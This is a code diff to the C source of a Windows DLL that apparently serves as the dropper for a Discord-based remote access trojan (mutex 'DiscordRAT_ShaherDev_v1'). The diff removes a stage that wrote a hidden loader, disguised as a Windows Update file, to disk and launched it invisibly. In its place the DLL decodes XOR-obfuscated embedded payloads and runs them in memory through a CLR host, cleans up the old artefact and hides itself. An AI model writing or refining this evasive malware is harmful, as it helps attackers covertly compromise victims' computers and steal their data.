@@ -1,12 +1,11 @@
 #include <windows.h>
 #include <shlobj.h>
 #include <strsafe.h>
-#include <winhttp.h>
+
+#include "clr_host.h"
 
 #pragma comment(lib, "shell32.lib")
-#pragma comment(lib, "winhttp.lib")
 
-#define RES_LOADER 101
 #define RES_CORE 102
 #define RES_TOKEN 103
 #define RES_MEDIA 104
@@ -48,6 +47,22 @@ static void HideSelfDll()
     if (GetModuleFileNameW(g_selfModule, selfPath, MAX_PATH))
     {
         HideSystemPath(selfPath);
+    }
+}
+
+static void CleanupLegacyPayloadFiles()
+{
+    wchar_t localAppData[MAX_PATH] = { 0 };
+    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData)))
+    {
+        return;
+    }
+
+    wchar_t legacyPath[MAX_PATH] = { 0 };
+    if (SUCCEEDED(StringCchPrintfW(legacyPath, MAX_PATH, L"%s\\Microsoft\\Windows\\AppReadiness\\WaaSMedicSvc.db", localAppData)))
+    {
+        SetFileAttributesW(legacyPath, FILE_ATTRIBUTE_NORMAL);
+        DeleteFileW(legacyPath);
     }
 }
 
@@ -103,159 +118,6 @@ static void FreeBuffer(BYTE* data)
     }
 }
 
-static bool WriteAllToHandle(HANDLE handle, const void* data, DWORD size)
-{
-    const BYTE* cursor = (const BYTE*)data;
-    DWORD remaining = size;
-
-    while (remaining > 0)
-    {
-        DWORD written = 0;
-        if (!WriteFile(handle, cursor, remaining, &written, NULL) || written == 0)
-        {
-            return false;
-        }
-        cursor += written;
-        remaining -= written;
-    }
-
-    return true;
-}
-
-static bool WriteUInt32(HANDLE handle, DWORD value)
-{
-    return WriteAllToHandle(handle, &value, sizeof(value));
-}
-
-static bool EnsureLoaderDbPath(wchar_t* outPath, size_t outChars)
-{
-    wchar_t localAppData[MAX_PATH] = { 0 };
-    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData)))
-    {
-        return false;
-    }
-
-    wchar_t dir[MAX_PATH] = { 0 };
-    if (FAILED(StringCchPrintfW(dir, MAX_PATH, L"%s\\Microsoft\\Windows\\AppReadiness", localAppData)))
-    {
-        return false;
-    }
-
-    SHCreateDirectoryExW(NULL, dir, NULL);
-    return SUCCEEDED(StringCchPrintfW(outPath, outChars, L"%s\\WaaSMedicSvc.db", dir));
-}
-
-static bool EnsureLoaderDbOnDisk(const wchar_t* loaderPath, BYTE* loaderExe, DWORD loaderSize)
-{
-    WIN32_FILE_ATTRIBUTE_DATA attrs = { 0 };
-    if (GetFileAttributesExW(loaderPath, GetFileExInfoStandard, &attrs))
-    {
-        if (attrs.nFileSizeLow == loaderSize && attrs.nFileSizeHigh == 0)
-        {
-            HideSystemPath(loaderPath);
-            return true;
-        }
-    }
-
-    HANDLE loaderFile = CreateFileW(
-        loaderPath,
-        GENERIC_WRITE,
-        0,
-        NULL,
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
-        NULL);
-
-    if (loaderFile == INVALID_HANDLE_VALUE)
-    {
-        return false;
-    }
-
-    bool written = WriteAllToHandle(loaderFile, loaderExe, loaderSize);
-    CloseHandle(loaderFile);
-
-    if (!written)
-    {
-        DeleteFileW(loaderPath);
-        return false;
-    }
-
-    HideSystemPath(loaderPath);
-    return true;
-}
-
-static bool LaunchLoaderFromMemory(BYTE* loaderExe, DWORD loaderSize, BYTE* core, DWORD coreSize, BYTE* token, DWORD tokenSize, BYTE* media, DWORD mediaSize)
-{
-    wchar_t loaderPath[MAX_PATH] = { 0 };
-    if (!EnsureLoaderDbPath(loaderPath, MAX_PATH))
-    {
-        return false;
-    }
-
-    if (!EnsureLoaderDbOnDisk(loaderPath, loaderExe, loaderSize))
-    {
-        return false;
-    }
-
-    SECURITY_ATTRIBUTES sa = { 0 };
-    sa.nLength = sizeof(sa);
-    sa.bInheritHandle = TRUE;
-
-    HANDLE readPipe = NULL;
-    HANDLE writePipe = NULL;
-    if (!CreatePipe(&readPipe, &writePipe, &sa, 1024 * 1024))
-    {
-        DeleteFileW(loaderPath);
-        return false;
-    }
-
-    SetHandleInformation(writePipe, HANDLE_FLAG_INHERIT, 0);
-
-    STARTUPINFOW si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
-    si.wShowWindow = SW_HIDE;
-    si.hStdInput = readPipe;
-    si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
-    si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
-
-    wchar_t commandLine[MAX_PATH + 32] = { 0 };
-    StringCchPrintfW(commandLine, MAX_PATH + 32, L"\"%s\" --pipe", loaderPath);
-
-    if (!CreateProcessW(loaderPath, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
-    {
-        CloseHandle(readPipe);
-        CloseHandle(writePipe);
-        DeleteFileW(loaderPath);
-        return false;
-    }
-
-    CloseHandle(readPipe);
-
-    bool ok = WriteUInt32(writePipe, coreSize) &&
-        WriteAllToHandle(writePipe, core, coreSize) &&
-        WriteUInt32(writePipe, tokenSize) &&
-        WriteAllToHandle(writePipe, token, tokenSize) &&
-        WriteUInt32(writePipe, mediaSize) &&
-        WriteAllToHandle(writePipe, media, mediaSize);
-
-    CloseHandle(writePipe);
-
-    if (!ok)
-    {
-        TerminateProcess(pi.hProcess, 0);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        DeleteFileW(loaderPath);
-        return false;
-    }
-
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    return true;
-}
-
 static void LaunchEmbeddedPayloadInMemory()
 {
     HANDLE runningMutex = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\DiscordRAT_ShaherDev_v1");
@@ -266,20 +128,17 @@ static void LaunchEmbeddedPayloadInMemory()
         return;
     }
 
-    BYTE* loaderExe = NULL;
+    CleanupLegacyPayloadFiles();
+
     BYTE* core = NULL;
     BYTE* token = NULL;
     BYTE* media = NULL;
-    DWORD loaderSize = 0;
     DWORD coreSize = 0;
     DWORD tokenSize = 0;
     DWORD mediaSize = 0;
 
-    if (!LoadResourceBuffer(RES_LOADER, &loaderExe, &loaderSize) ||
-        !LoadResourceBuffer(RES_CORE, &core, &coreSize))
+    if (!LoadResourceBuffer(RES_CORE, &core, &coreSize))
     {
-        FreeBuffer(loaderExe);
-        FreeBuffer(core);
         HideSelfDll();
         return;
     }
@@ -296,9 +155,14 @@ static void LaunchEmbeddedPayloadInMemory()
         XorDecodeBuffer(media, mediaSize);
     }
 
-    LaunchLoaderFromMemory(loaderExe, loaderSize, core, coreSize, token ? token : (BYTE*)"", tokenSize, media ? media : (BYTE*)"", mediaSize);
+    ClrStartPayload(
+        core,
+        coreSize,
+        token ? token : (const BYTE*)"",
+        tokenSize,
+        media ? media : (const BYTE*)"",
+        mediaSize);
 
-    FreeBuffer(loaderExe);
     FreeBuffer(core);
     FreeBuffer(token);
     FreeBuffer(media);
